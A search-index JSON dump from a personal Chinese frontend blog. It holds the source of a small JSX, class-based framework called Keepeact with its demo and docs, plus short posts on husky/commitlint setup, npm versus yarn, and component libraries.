{"pages":[{"title":"","text":"Keepeact .markdown { margin-bottom: 16px } &lt;body> &lt;div id=\"wrapper\"> &lt;div id=\"demo\">&lt;/div> &lt;/div> &lt;/body> &lt;script type=\"module\"> import { WelCome } from '/js/keepeact.js'; WelCome.create(document.querySelector('#demo'), { valueChange(e) { console.log('coutn:', e); } }) &lt;/script> // Button import { ValueComponent, Component, Watch, Prop, Ref } from 'keepeact'; @Component() export default class Button extends ValueComponent { count = 0; showStop = true; @Prop() defaultCount: number; @Prop() max: number = 3; @Ref('button') buttonEl: HTMLElement; @Watch('count', { immediate: true, }) countChange(a, b) { console.log('监测 count:', `oldValue: ${a}`, `newValue: ${b}`); this.showStop = this.count > this.max; } get countValue() { return this.showStop ? 'stop' : this.count; } button() { this.$nextTick(() => { console.log(this.buttonEl.innerText); }); return ( &lt;button onClick={() => { if (this.showStop) return; this.count++; this.onChange(this.count); }} > click+1 &lt;/button> ); } render() { return ( &lt;div id=\"wuxunyu\" ref=\"button\"> {this.countValue} {this.button()} &lt;/div> ); } } // WelCome import { Component, ValueComponent } from 'keepeact'; import Button from './button/button.component'; @Component() export default class WelCome extends ValueComponent { max = 6; buttonDemo() { return ( &lt;Button valueChange={(e) => { this.onChange(e); }} max={this.max} >&lt;/Button> ); } render() { const welcomeWrapper = ( &lt;div> &lt;p>WelCome to Keepeact, I wish you like it.&lt;/p> &lt;p>demo: well stop, if count {'>'} {this.max}&lt;/p> &lt;ul> &lt;li>{this.buttonDemo()}&lt;/li> &lt;/ul> &lt;/div> ); return welcomeWrapper; } } import { WelCome } from '/js/keepeact.js'; WelCome.create(document.querySelector('#demo'), { valueChange(e) { console.log('count:', e); } })","link":"/keepeact/demo/"},{"title":"","text":"function isEmpty(value) { return Array.isArray(value) ? value.length === 0 : value == null; } const toKebabCase = (value) => value.replace(/([a-z0-9]|(?=[A-Z]))([A-Z])/g, \"$1-$2\").toLowerCase(); const handlers = [\"onclick\", \"onClick\", \"onchange\", \"onChange\", \"oninput\", \"onInput\"]; class VNode { constructor(type, attributes, listeners, children, text) { this.type = type; this.children = children; this.text = text; this.attributes = attributes; this.listeners = listeners; this.key = attributes && attributes.key; } } function createVNode(type, props, ...children) { const attributes = props && Object.keys(props).filter((v) => !handlers.includes(v)).reduce((pre, cur) => { pre[cur] = props[cur]; return pre; }, {}); const listeners = props && Object.keys(props).filter((v) => handlers.includes(v)).reduce((pre, cur) => { pre[cur] = props[cur]; return pre; }, {}); const vchildren = children && children.flat(2).map((v) => { return (v == null ? void 0 : v.type) != null ? v : createTextVNode(v); }); return new VNode(type, attributes, listeners, vchildren, void 0); } function createTextVNode(text) { return new VNode(void 0, void 0, void 0, void 0, String(text) || \"\"); } function isVText(vnode) { return vnode.text != null; } function isVDom(vnode) { return typeof vnode.type === \"string\"; } function isVComponent(vnode) { return typeof vnode.type === \"function\" && vnode.type.prototype && vnode.type.prototype.render; } class Diff { constructor(dom) { this.dom = dom; } sameVNode(a, b) { if (a.type === b.type && a.key === b.key && this.sameInputType(a, b)) { return true; } } sameInputType(a, b) { if (a.type !== \"input\") { return true; } const a1 = a.attributes.type; const b1 = b.attributes.type; if (a1 == null && b1 == null) { return true; } return a1 === b1; } patch(oldVNode, newVNode) { this.checkDuplicateKeys(newVNode.children); if (this.sameVNode(oldVNode, newVNode)) { this.patchVNode(oldVNode, newVNode); } else { const oldElmParent = oldVNode.elm.parentNode; this.dom.createElement(newVNode); this.dom.insertBefore(oldElmParent, newVNode.elm, oldVNode.elm); this.dom.removeChild(oldElmParent, oldVNode.elm); } } patchVNode(oldVNode, newVNode) { if (newVNode === oldVNode) { return; } const elm = newVNode.elm = oldVNode.elm; if (isVText(newVNode)) { if (isVText(oldVNode) && newVNode.text !== oldVNode.text) { oldVNode.elm.data = newVNode.text; } } else if (isVDom(oldVNode) && isVDom(newVNode)) { this.dom.updateVDom(elm, oldVNode, newVNode); if (!isEmpty(oldVNode.children) && !isEmpty(newVNode.children) && oldVNode.children !== newVNode.children) { this.updateChildren(elm, oldVNode.children, newVNode.children); } else if (!isEmpty(newVNode.children)) { newVNode.children.forEach((v) => { this.dom.createElement(v); this.dom.appendChild(elm, v.elm); }); } else if (!isEmpty(oldVNode.children)) { this.dom.removeChildren(elm); } } if (isVComponent(oldVNode) && isVComponent(newVNode)) { newVNode.component = oldVNode.component; } } updateChildren(parentNode, oldChild, newChild) { let oldStartIndx = 0; let newStartIndx = 0; let oldEndIndx = oldChild.length - 1; let newEndIndx = newChild.length - 1; let oldStartNode = oldChild[0]; let oldEndNode = oldChild[oldEndIndx]; let newStartNode = newChild[0]; let newEndNode = newChild[newEndIndx]; let keyMap; while (oldStartIndx v[0]); searchOriginMathods.forEach((method) => { arrayInstrumentations[method] = function(...args) { const orignMethod = Array.prototype[method]; let res = orignMethod.apply(this, args); if (res === false || res === -1) { res = orignMethod.apply(this[\"_raw\"], args); } return res; }; }); const ITERATE_KEY = Symbol(); function createReactive(obj, isShallow, isReadonly) { const data = new Proxy(obj, { get(target, key, receiver) { if (key === \"_raw\") { return target; } if (Array.isArray(target) && arrayInstrumentations.hasOwnProperty(key)) { return Reflect.get(arrayInstrumentations, key, receiver); } if (!isReadonly) { track(target, key); } const res = Reflect.get(target, key, receiver); if (isShallow) { return res; } if (typeof res === \"object\" && res != null) { return isReadonly ? readonly(res) : reactive(res); } return res; }, set(target, key, newValue, receiver) { if (isReadonly) { console.error(`\\u5C5E\\u6027: [${String(key)}] \\u53EA\\u8BFB`); return true; } const oldValue = target[key]; const type = Array.isArray(target) ? Number(key) < target.length ? \"EDIT\" : \"ADD\" : target[key] ? \"EDIT\" : \"ADD\"; const res = Reflect.set(target, key, newValue, receiver); const isTarget = () => receiver._raw === target; if (isTarget()) { if (oldValue !== newValue && (oldValue === oldValue || newValue === newValue)) { trigger(target, key, type, newValue); } } return res; }, deleteProperty(target, key) { const hadKey = Object.prototype.hasOwnProperty.call(target, key); const res = Reflect.deleteProperty(target, key); if (hadKey && res) { trigger(target, key, \"DELETE\"); } return res; }, has(target, key) { track(target, key); return Reflect.has(target, key); }, ownKeys(target) { track(target, Array.isArray(target) ? \"length\" : ITERATE_KEY); return Reflect.ownKeys(target); } }); return data; } const reactiveMap = /* @__PURE__ */ new Map(); function reactive(obj) { const exisit = reactiveMap.get(obj); if (exisit) return exisit; const proxy = createReactive(obj); reactiveMap.set(obj, proxy); return proxy; } function ref(value) { const wrapper = { value }; Object.defineProperty(wrapper, \"__is_ref\", { value: true }); return reactive(wrapper); } function readonly(obj) { return createReactive(obj, false, true); } const bucket = /* @__PURE__ */ new WeakMap(); let effectActiveFn = null; let effectStack = []; let shouldTrack = true; var OriginMathods = /* @__PURE__ */ ((OriginMathods2) => { OriginMathods2[\"push\"] = \"push\"; OriginMathods2[\"pop\"] = \"pop\"; OriginMathods2[\"shift\"] = \"shift\"; OriginMathods2[\"unshift\"] = \"unshift\"; return OriginMathods2; })(OriginMathods || {}); const orignMethods = Object.entries(OriginMathods).map((v) => v[0]); orignMethods.forEach((method) => { arrayInstrumentations[method] = function(...args) { const orignMethod = Array.prototype[method]; shouldTrack = false; const res = orignMethod.apply(this, args); shouldTrack = true; return res; }; }); function effect(fn, options) { const effectFn = () => { cleanup(effectFn); effectActiveFn = effectFn; effectStack.push(effectFn); const res = fn(); effectStack.pop(); effectActiveFn = effectStack[effectStack.length - 1]; return res; }; effectFn.deps = []; effectFn.options = options; if (!(options == null ? void 0 : options.lazy)) { effectFn(); } return effectFn; } function cleanup(effectFn) { for (let i = 0; i < effectFn.deps.length; i++) { const v = effectFn.deps[i]; v.delete(effectFn); } effectFn.deps.length = 0; } function track(target, key) { if (!effectActiveFn || !shouldTrack) { return; } let depsMap = bucket.get(target); if (!depsMap) { bucket.set(target, depsMap = /* @__PURE__ */ new Map()); } let deps = depsMap.get(key); if (!deps) { depsMap.set(key, deps = /* @__PURE__ */ new Set()); } deps.add(effectActiveFn); effectActiveFn.deps.push(deps); } function trigger(target, key, type, newValue) { let depsMap = bucket.get(target); if (!depsMap) { return; } const effects = depsMap.get(key); const effectToRun = /* @__PURE__ */ new Set(); effects == null ? void 0 : effects.forEach((fn) => { if (fn !== effectActiveFn) { effectToRun.add(fn); } }); if (type === TriggleType.ADD || type === TriggleType.DELETE) { const iterateEffects = depsMap.get(ITERATE_KEY); iterateEffects == null ? void 0 : iterateEffects.forEach((fn) => { if (fn !== effectActiveFn) { effectToRun.add(fn); } }); } if (type === TriggleType.ADD && Array.isArray(target)) { const lengthEffects = depsMap.get(\"length\"); lengthEffects == null ? void 0 : lengthEffects.forEach((fn) => { if (fn !== effectActiveFn) { effectToRun.add(fn); } }); } if (key === \"length\" && Array.isArray(target)) { depsMap.forEach((effects2, key2) => { if (key2 >= newValue) { effects2 == null ? void 0 : effects2.forEach((fn) => { if (fn !== effectActiveFn) { effectToRun.add(fn); } }); } }); } effectToRun.forEach((fn) => { var _a; if ((_a = fn == null ? void 0 : fn.options) == null ? void 0 : _a.scheduler) { fn.options.scheduler(fn); } else { fn(); } }); } function watch(source, cb, options = {}) { let getter; if (typeof source === \"function\") { getter = source; } else if (typeof source === \"object\") { getter = () => options.deep ? traverse(source) : source; } else { console.error(`${source} \\u4E0D\\u662F\\u4E00\\u4E2A\\u51FD\\u6570\\u6216\\u8005\\u5BF9\\u8C61`); } let oldValue; let cleanup2; function onInValidate(fn) { cleanup2 = fn; } const job = () => { const newValue = effectFn(); if (cleanup2) { cleanup2(); } cb(oldValue, newValue, onInValidate); oldValue = newValue; }; const effectFn = effect(() => getter(), { lazy: true, scheduler: job }); if (options.immediate) { job(); } else { oldValue = effectFn(); } } function traverse(value, seen = /* @__PURE__ */ new Set()) { if (value == null || typeof value !== \"object\" || seen.has(value)) return value; seen.add(value); for (const key in value) { if (Object.prototype.hasOwnProperty.call(value, key)) { traverse(value[key], seen); } } return value; } class Dom { constructor(context) { this.context = context; } createElement(vnode) { var _a; if (isVDom(vnode)) { const el = document.createElement(vnode.type); vnode.elm = el; if (vnode.children) { vnode.children.forEach((v) => { const node = this.createElement(v); node && this.appendChild(vnode.elm, node); }); } vnode.listeners && Object.keys(vnode.listeners).forEach((v) => { const name = v.toLowerCase().replace(/^on/, \"\"); const value = vnode.listeners[v]; vnode.elm.addEventListener(name, value); }); vnode.attributes && Object.keys(vnode.attributes).forEach((v) => { const name = v; const value = vnode.attributes[v]; this.setAttribute(el, name, value); }); return vnode.elm; } else if (isVText(vnode)) { const text = document.createTextNode(vnode.text); vnode.elm = text; } else if (isVComponent(vnode)) { vnode.component = KComponent.create(vnode.type, { ...vnode.listeners, ...vnode.attributes }); vnode.elm = (_a = vnode.component.$vNode) == null ? void 0 : _a.elm; } return vnode.elm; } appendChild(parentNode, newNode) { parentNode.appendChild(newNode); } insertBefore(parentNode, newNode, node) { parentNode.insertBefore(newNode, node); } removeChild(parentNode, node) { parentNode.removeChild(node); } removeChildren(parentNode) { const child = parentNode.childNodes; for (let i = child.length - 1; i >= 0; --i) { this.removeChild(parentNode, child[i]); } } destroyComponents(vnode) { var _a; if (isVComponent(vnode)) { (_a = vnode.component) == null ? void 0 : _a.destroy(); vnode.children.forEach((c) => this.destroyComponents(c)); } } nextSibling(node) { return node.nextSibling; } setAttribute(elm, key, newValue) { if (key === \"valueChange\") return; if (key === \"value\") { elm[key] = newValue; } else if (key === \"ref\") { this.context.$refs[newValue] = elm; } else if (key === \"style\" || key === \"class\") { const v = this.normalizeAttr(key, newValue); elm.setAttribute(key, v); } else { elm.setAttribute(key, newValue); } } styleObjToString(value) { let str; for (const key in value) { if (Object.prototype.hasOwnProperty.call(value, key)) { const v = value[key]; const k = toKebabCase(key); if (v) { if (!str) { str = `${k}:${v}`; } else { str += `;${k}:${v}`; } } } } return str; } classObjToString(value) { let str; for (const key in value) { if (Object.prototype.hasOwnProperty.call(value, key)) { const v = value[key]; if (v) { if (!str) { str = key; } else { str += ` ${key}`; } } } } return str; } normalizeAttr(attrKey, value) { let str; if (typeof value === \"string\") { return str; } else if (typeof value === \"object\" && !Array.isArray(value)) { if (attrKey === \"class\") { str = this.classObjToString(value); } else if (attrKey === \"style\") { str = this.styleObjToString(value); } } else if (Array.isArray(value)) { for (const v of value) { if (typeof v === \"string\") { if (!isEmpty(v)) { if (!str) { str = v; } else { str += ` ${v}`; } } } else if (typeof v === \"object\" && !Array.isArray(v)) { const c = this.normalizeAttr(attrKey, v); if (c) { str += ` ${c}`; } } } } return str; } updateVDom(elm, oldVNode, newVnode) { if (isVDom(newVnode) && elm instanceof HTMLElement) { newVnode.attributes && Object.keys(newVnode.attributes).forEach((key) => { const oldValue = oldVNode.attributes[key]; const newValue = newVnode.attributes[key]; if (oldValue === newValue) { return; } else if (!isEmpty(newValue)) { this.setAttribute(elm, key, newValue); } }); oldVNode.attributes && Object.keys(oldVNode.attributes).forEach((key) => { const newValue = newVnode.attributes[key]; if (isEmpty(newValue)) { elm.removeAttribute(key); } }); newVnode.listeners && Object.keys(newVnode.listeners).forEach((key) => { const oldValue = oldVNode.listeners[key]; const newValue = newVnode.listeners[key]; const handleName = key.toLowerCase().replace(/^on/, \"\"); if (oldValue === newValue) { return; } else if (!isEmpty(newValue)) { if (!isEmpty(oldValue)) { elm.removeEventListener(handleName, oldValue); } elm.addEventListener(handleName, newValue); } }); oldVNode.listeners && Object.keys(oldVNode.listeners).forEach((key) => { const newValue = newVnode.listeners[key]; const handleName = key.toLowerCase().replace(/^on/, \"\"); if (isEmpty(newValue)) { elm.addEventListener(handleName, newValue); } }); } } } var ChangeDetectionStrategy = /* @__PURE__ */ ((ChangeDetectionStrategy2) => { ChangeDetectionStrategy2[ChangeDetectionStrategy2[\"Onpush\"] = 0] = \"Onpush\"; ChangeDetectionStrategy2[ChangeDetectionStrategy2[\"Default\"] = 1] = \"Default\"; return ChangeDetectionStrategy2; })(ChangeDetectionStrategy || {}); function Component(options) { const s = (arg) => { }; const r = (arg) => { }; const stage = { render: r, setup: s }; return function(arg) { var _a, _b; arg.create = function(container, p2) { mountComponent(container, { content: arg, props: p2 }); }; arg.prototype.$stage = (_a = options == null ? void 0 : options.changeDetection) != null ? _a : 1; (_b = stage[ChangeDetectionStrategy[options == null ? void 0 : options.changeDetection]]) == null ? void 0 : _b.call(stage, arg); }; } function Watch(path, options = {}) { return createDecorator((ctx, target, name) => { const cb = target[name]; const pathList = path.trim().split(\".\"); let objValue = ctx; let lastPath = pathList[pathList.length - 1]; for (const key of pathList) { if (key === lastPath) { break; } objValue = objValue[key]; } const obj = objValue[lastPath][\"_raw\"]; const value = createComponentPropsReactive(objValue, lastPath); watch(typeof obj === \"object\" ? value.value : () => value.value, (...arg) => cb.apply(ctx, arg), options); }); } function Prop() { return createDecorator(function(ctx, target, name) { const outValue = ctx.$props[name]; createComponentPropsReactive(ctx, name, true, outValue); }); } function Ref(key) { return createDecorator(function(ctx, target, name) { ctx[name] = { is_kp_DomRef: true }; ctx.$nextTick(() => { ctx[name] = ctx.$refs[key]; }); }, true); } let flushing = false; const p = Promise.resolve(); const jobQueue = /* @__PURE__ */ new Set(); function flushJob() { if (!jobQueue) return; if (flushing) return; flushing = true; p.then(() => { jobQueue.forEach((fn) => { fn(); }); }).finally(() => flushing = false); } class KComponent { constructor(arg) { this.$refs = {}; this.$updating = false; this.$dom = new Dom(this); this.$diff = new Diff(this.$dom); Object.assign(this, arg); } $nextTick(fn) { let p1; if (fn) { p.then(() => { fn(); }); } else { p1 = p; } return p1; } writeValue(value) { } static create(com, props, $el) { var _a, _b; const component = new com({ $el, ...props }); component.$props = props; if (component.writeValue) { component.writeValue(props && props.value); } (_a = component.$RefDecorators) == null ? void 0 : _a.forEach((fn) => fn(component)); if (component.$stage === 1 || component.$stage == null) { createComponentReactive(component); } (_b = component.$Decorators) == null ? void 0 : _b.forEach((fn) => fn(component)); component.created(); component.beforeMount(); component.mount(); component.mounted(); return component; } created() { } beforeMount() { } mount() { effect(() => { this.patch(); }, { scheduler(fn) { jobQueue.add(fn); flushJob(); } }); } mountElement() { this.$vNode = this.render(); const node = this.$dom.createElement(this.$vNode); if (this.$el && node) { this.$dom.insertBefore(this.$el.parentNode, node, this.$el.nextSibling); this.$dom.removeChild(this.$el.parentNode, this.$el); } } patchComponent() { let newVNode = this.render(); if (!newVNode) { newVNode = createTextVNode(\"\"); } this.$diff.patch(this.$vNode, newVNode); this.$vNode = newVNode; } update() { if (this.$updating) { return; } this.$updating = true; Promise.resolve().then(() => { this.$updating = false; this.patch(); this.updated(); }); } patch() { if (!this.$vNode) { this.mountElement(); } else { this.patchComponent(); } } mounted() { } updated() { } destroy() { } } class ValueComponent extends KComponent { onChange(value) { if (this.valueChange) { this.valueChange(value); } } } function createComponentReactive(componentObj) { const obj = {}; for (const key in componentObj) { if (Object.prototype.hasOwnProperty.call(componentObj, key)) { const element = componentObj[key]; const isComputed = typeof element === \"object\" && element.is_kp_computed; const isDomRef = typeof element === \"object\" && element.is_kp_DomRef; if (!key.startsWith(\"$\") && !isComputed && !isDomRef && !(element instanceof Set) && !(element instanceof Map)) { obj[key] = element; } } } const reactiveData = reactive(obj); for (const key in reactiveData) { Object.defineProperty(componentObj, key, { get() { return reactiveData[key]; }, set(value) { reactiveData[key] = value; componentObj.updated(); } }); } } function createComponentPropsReactive(target, key, readonly2, outValue) { const value = ref(outValue || target[key]); Object.defineProperty(target, key, { get() { return value.value; }, set(newValue) { if (readonly2) { console.error(new Error(`Prop ${key} \\u5C5E\\u6027\\u4E0D\\u80FD\\u4FEE\\u6539`)); } else { value.value = newValue; target.updated(); } } }); return value; } function createDecorator(factory, is_kp_DomRef) { return function(...rest) { const [target] = rest; const props = is_kp_DomRef ? \"$RefDecorators\" : \"$Decorators\"; (target[props] || (target[props] = [])).push((ctx) => factory(ctx, ...rest)); }; } function mountComponent(container, p2) { const { props, content } = p2; KComponent.create(content, props, container); } var button_component = /* @__PURE__ */ (() => \"button{color:red}\\n\")(); var __defProp$1 = Object.defineProperty; var __getOwnPropDesc$1 = Object.getOwnPropertyDescriptor; var __decorateClass$1 = (decorators, target, key, kind) => { var result = kind > 1 ? void 0 : kind ? __getOwnPropDesc$1(target, key) : target; for (var i = decorators.length - 1, decorator; i >= 0; i--) if (decorator = decorators[i]) result = (kind ? decorator(target, key, result) : decorator(result)) || result; if (kind && result) __defProp$1(target, key, result); return result; }; let KButton = class extends ValueComponent { constructor() { super(...arguments); this.count = 0; this.showStop = true; this.max = 3; } countChange(a, b) { console.log(\"\\u76D1\\u6D4B count:\", `oldValue: ${a}`, `newValue: ${b}`); this.showStop = this.count > this.max; } get countValue() { return this.showStop ? \"stop\" : this.count; } button() { this.$nextTick(() => { console.log(this.buttonEl.innerText); }); return /* @__PURE__ */ createVNode(\"button\", { onClick: () => { if (this.showStop) return; this.count++; this.onChange(this.count); } }, \"click+1\"); } render() { return /* @__PURE__ */ createVNode(\"div\", { id: \"wuxunyu\", ref: \"button\" }, this.countValue, \" \", this.button()); } }; __decorateClass$1([ Prop() ], KButton.prototype, \"defaultCount\", 2); __decorateClass$1([ Prop() ], KButton.prototype, \"max\", 2); __decorateClass$1([ Ref(\"button\") ], KButton.prototype, \"buttonEl\", 2); __decorateClass$1([ Watch(\"count\", { immediate: true }) ], KButton.prototype, \"countChange\", 1); KButton = __decorateClass$1([ Component() ], KButton); var __defProp = Object.defineProperty; var __getOwnPropDesc = Object.getOwnPropertyDescriptor; var __decorateClass = (decorators, target, key, kind) => { var result = kind > 1 ? void 0 : kind ? __getOwnPropDesc(target, key) : target; for (var i = decorators.length - 1, decorator; i >= 0; i--) if (decorator = decorators[i]) result = (kind ? decorator(target, key, result) : decorator(result)) || result; if (kind && result) __defProp(target, key, result); return result; }; let WelCome = class extends ValueComponent { constructor() { super(...arguments); this.max = 6; } buttonDemo() { return /* @__PURE__ */ createVNode(KButton, { valueChange: (e) => { this.onChange(e); }, max: this.max }); } render() { const welcomeWrapper = /* @__PURE__ */ createVNode(\"div\", null, /* @__PURE__ */ createVNode(\"p\", null, \"WelCome to Keepeact.\"), /* @__PURE__ */ createVNode(\"p\", null, \"demo: well stop, if count \", \">\", \" \", this.max), /* @__PURE__ */ createVNode(\"ul\", null, /* @__PURE__ */ createVNode(\"li\", null, this.buttonDemo()))); return welcomeWrapper; } }; WelCome = __decorateClass([ Component() ], WelCome); export { KButton, WelCome, mountComponent };","link":"/js/keepeact.js"}],"posts":[{"title":"The keep-ui Base On Stencil - Web Components","text":"简介一个基于 Stencil 的框架ui, 目前只停留于设计阶段,有关 Stencil 的资料请移步它的官网 keep-ui 的架构思路图 项目地址gitee: https://gitee.com/aHon00/keep-ui-framework","link":"/2022/03/31/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/keep-ui/"},{"title":"keepeact","text":"前言keepeact 受 jsx, vue-decorator-property 和 vue的数据劫持机制 启发, 名字来源自 keep, 保持积极向上的学习态度, 又因为是 jsx 所以自然而然是取 react, 合起来便是 keepeact 简介keepeact 是一个由 typescript 和 vue.js 3.x 数据检测机制结合而成的小型框架，写法结合现代 jsx，class-style 写法，内置 diff 算法和批量更新策略优化了渲染效率，打包工具为 vite，能提供较好的开发环境简单，易上手，如果想为 jq 栈提供一套简单组件 ui，或者其他框架也可使用它 demo 一览 在线演示： demo 1234567import { ValueComponent, Component } from 'keepeact';@Component()export default class Button extends ValueComponent { render() { return &lt;button&gt;button&lt;/button&gt;; }} 开始1npm install keepeact-cli -g 创建安装123kp create [filename]&amp;yarn 生命周期生命周期包含了 constructor writeValue created beforeMount mounted updated destroy; constructor 是指该组件实例化时调用 writeValue 是提供给外部传入 value 时，可接受 value 的 回调函数，实例化后调用 created 当声明的属性完成数据监测时调用 beforeMount 当真实 dom 挂载之前 mountd 调用 render，真实 dom 挂载之后调用 updated 当响应数据更新之后调用 destroy 当组件被卸载销毁时调用 响应式与非响应绑定属性1234567...export default class Button extends ValueComponent { text = 'button'; // 此处完成绑定，该值变动会引起render的执行 render() { return &lt;button&gt;{this.text}&lt;/button&gt;; }} 响应式数据类型除了 Set Map weakSet weakMap 数据结构外，可对普通对象，数组和其他简单类型进行响应式追踪; 此外，针对非响应式数据，还提供了 update 方法，手动更新界面; 123456789101112131415import { ValueComponent, Component, ChangeDetectionStrategy } from 'keepeact';@Component()export default class Button extends ValueComponent { text = 'button'; set = new Set(); mounted() { this.set.add(1); this.update(); } render() { console.log(this.set); // Set([1]) return &lt;button&gt;{this.text}&lt;/button&gt;; }} 非响应式组件提供了两种更新策略, 自动更新(Default) 和 手动更新(Onpush),可供用户自由选择，更自由掌控数据响应，默认时 Default 模式 1234567891011121314...@Component({ changeDetection: ChangeDetectionStrategy.Onpush // 开启Onpush时，全部数据将手动})export default class Button extends ValueComponent { text = 'button'; mounted() { this.text = 'button1'; this.update(); } render() { return &lt;button&gt;{this.text}&lt;/button&gt;; }} 对象方法已经对push/pop/shift/unshift 数组方法进行劫持。并且可在 render 函数中使用 includes/indexOf 查询方法，对应的数据发生改变也可响应; 1234567891011...export default class Button extends ValueComponent { text = 'button'; mounted() { this.text = 'button1'; } render() { console.log(this.text.includes('1')); // 第二次运行 true return &lt;button&gt;{this.text}&lt;/button&gt;; }} class 和 style 绑定1234&lt;div class={['foo', { bar: true }]} style={{ fontSize: '16px', 'font-weight': 'bold' }}&gt;&lt;/div&gt; 对应的html 1234&lt;div class=&quot;foo bar&quot;style=&quot;font-size: 16px; font-weight: bold&quot;&gt;&lt;/div&gt; 计算属性和侦听器计算属性1234567891011...export default class Button extends ValueComponent { count = 0; count1 = 1; get computeCount() { return this.count + this.count1; } render() { return &lt;button&gt;{this.computeCount}&lt;/button&gt;; }} 但上面方式对于性能并不是最优的，因为它没有缓存，也就是读取 computeCount 函数都会执行一遍,推荐用 computed 函数计算，暂时的唯一缺点就是访问时需要访问成员 value ，不过后续会考虑自动脱 value 12345678910import { ValueComponent, Component } from 'keepeact';@Component()export default class Button extends ValueComponent { count = 0; count1 = 1; computeCount = computed(() =&gt; this.count + this.count1); render() { return &lt;button&gt;{this.computeCount.value}&lt;/button&gt;; }} 侦听器推荐使用 @Watch 装饰器 12345678910111213141516import { ValueComponent, Component, Watch } from 'keepeact';@Component()export default class Button extends ValueComponent { count = 0; @Watch('count') countChange(oldValue, newValue) { console.log('oldValue:', oldValue); console.log('newValue:', newValue); } mounted() { this.count++; } render() { return &lt;button&gt;{this.count}&lt;/button&gt;; }} 访问Dom元素访问元素可使用 @Ref 或者 $refs 1234567891011121314151617import { ValueComponent, Component, Ref } from 'keepeact';@Component()export default class Button extends ValueComponent { count = 0; @Ref('button') buttonEl: HTMLElement; mounted() { this.$nextTick(() =&gt; { console.log(this.buttonEl); console.log(this.$refs['button']) }); } render() { return &lt;button ref=&quot;button&quot;&gt;{this.count}&lt;/button&gt;; }} 组件通讯props访问外部传进的数据可以使用 @Prop 接收，或者 $props 12345678910// childimport { ValueComponent, Component, Prop } from 'keepeact';@Component()export default class Child extends ValueComponent { @Prop() count; render() { console.log(this.$props); // { count: 1} return &lt;button&gt;{this.count}&lt;/button&gt;; }} 123456789// parentimport { ValueComponent, Component, Prop } from 'keepeact';@Component()export default class Parent extends ValueComponent { count = 1; render() { return &lt;Child count={this.count}&gt;&lt;/Child&gt;; }} 事件DOM元素上绑定事件 12345678910import { ValueComponent, Component, Prop } from 'keepeact';@Component()export default class Button extends ValueComponent { count = 0; render() { return &lt;button onClick={() =&gt; { this.count++ }}&gt;点我{this.count}&lt;/button&gt;; }} 同样的事件还有 onChange/onInput valueChange123456789101112// Childimport { ValueComponent, Component, Prop } from 'keepeact';@Component()export default class Child extends ValueComponent { count = 0; render() { return &lt;button onClick={() =&gt; { this.count++; this.onChange(`count:${count}`); }}&gt;点我{this.count}&lt;/button&gt;; }} 12345678910// Parentimport { ValueComponent, Component, Prop } from 'keepeact';@Component()export default class Parent extends ValueComponent { render() { return &lt;Child valueChange={(e) =&gt; { console.log(e); // count:1 count:2 count:3 }}&gt;&lt;/Child&gt;; }} 导出使用切记要声明 @Component 装饰器，因为他封装了一个 create 方法，便于用户将组件挂载到真实 Dom 上 12345678import { ValueComponent, Component } from 'keepeact';@Component() // 注意要加上export default class Button extends ValueComponent { text = 'button'; render() { return &lt;button&gt;{this.text}&lt;/button&gt;; }} 12import Button from './src/components/button';Button.create(el, {} /*props*/);","link":"/2022/07/04/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/keepeact/"},{"title":"代码生成工具","text":"思维导图","link":"/2022/03/21/%E6%9E%B6%E6%9E%84/apicodegen/"},{"title":"husky和commitlint的使用","text":"说明： 项目中需要约定提交信息规范，可使用 husky 和 commitlint，对 git 的 commit 信息进行校验。该插件针对，changelog 有很大的用处，因为生成 changelog 需要 commit 的规则规范，husky 和 commitlint 可以很好的配合 安装12yarn add husky --devyarn add pinst --dev # ONLY if your package is not private 开启 Git Hooks1yarn husky install 要在安装后自动启用 Git Hooks，请编辑 package.json123456{ &quot;private&quot;: true, // ← your package is private, you only need postinstall &quot;scripts&quot;: { &quot;postinstall&quot;: &quot;husky install&quot; }} postinstall 会在你 yarn 安装时自动执行 Hooks命令创建 hooks1npx husky add .husky/[gitHooks] [content] commit-msg12# $1 .git/COMMIT_EDITMSGnpx husky add .husky/commit-msg npx --no-install commitlint --edit $1 创建 commitlint.config.js 对 commit 校验 1module.exports = { extends: ['@commitlint/config-conventional'] }; 可扩展自定义规则，默认的规则如下： 123456789101112131415161718192021222324252627282930313233rules: { 'body-leading-blank': [1, 'always'], 'body-max-line-length': [2, 'always', 100], 'footer-leading-blank': [1, 'always'], 'footer-max-line-length': [2, 'always', 100], 'header-max-length': [2, 'always', 100], 'subject-case': [ 2, 'never', ['sentence-case', 'start-case', 'pascal-case', 'upper-case'], ], 'subject-empty': [2, 'never'], 'subject-full-stop': [2, 'never', '.'], 'type-case': [2, 'always', 'lower-case'], 'type-empty': [2, 'never'], 'type-enum': [ 2, 'always', [ 'build', 'chore', 'ci', 'docs', 'feat', 'fix', 'perf', 'refactor', 'revert', 'style', 'test', ], ],}, 测试1git commit s","link":"/2022/03/13/%E6%9E%B6%E6%9E%84/git%E8%A7%84%E8%8C%83/"},{"title":"npm和yarn如何选择","text":"新版本 npm 基本和 yarn 相当，但是一个项目甚至公司，都应该统一用一种管理工具；如何选择：● 选择 npm ：如果对当前的工作流程感到满意，不想安装额外的工具，并且没有很多磁盘空间。● 选择 yarn ：如果想要一些很棒的功能，比如即插即用，需要一些 npm 中缺少的功能，并且有足够的磁盘空间 npm version year 更新 v1 2010 v2 2014 v3 2015 扁平化 v4 2016 v5 2017 lock.json,缓存优化 v6 2018 安全 v7 2020 v8 2021 yarn version year 更新 v1 2016 v2 2020 v3 2021","link":"/2022/05/04/%E6%9E%B6%E6%9E%84/npmYarn/"},{"title":"vue-preset 脚手架","text":"思维导图","link":"/2022/03/21/%E6%9E%B6%E6%9E%84/vue%E8%84%9A%E6%89%8B%E6%9E%B6/"},{"title":"webpack","text":"思维导图","link":"/2022/05/04/%E6%9E%B6%E6%9E%84/webpack/"},{"title":"谈ng-zorro-antd组件库的构建思维","text":"为什么要使用组件库？如果不用会产生什么问题？假设我们不用组件库，一个系统有上百个页面，每个之间页面都是没有依赖的，这每个页面都有自己的组件，每当新建一个页面并且有用到相似组件，这份组件就有可能被拷贝一份。组件就被分隔成了互不干扰的状态，这样做确实有好处，好处就是产品突然有了灵感说，这个页面的某某控件想要优化点东西和交互效果，那就可以做到不影响其他页面的组件以达到产品的需求。那么问题来了， 若其中一个页面其中组件发现了 bug，那么这份源组件及其他副本组件都存在隐患，都需要进行修复，这样的工作量无疑是繁琐且浪费精力的。 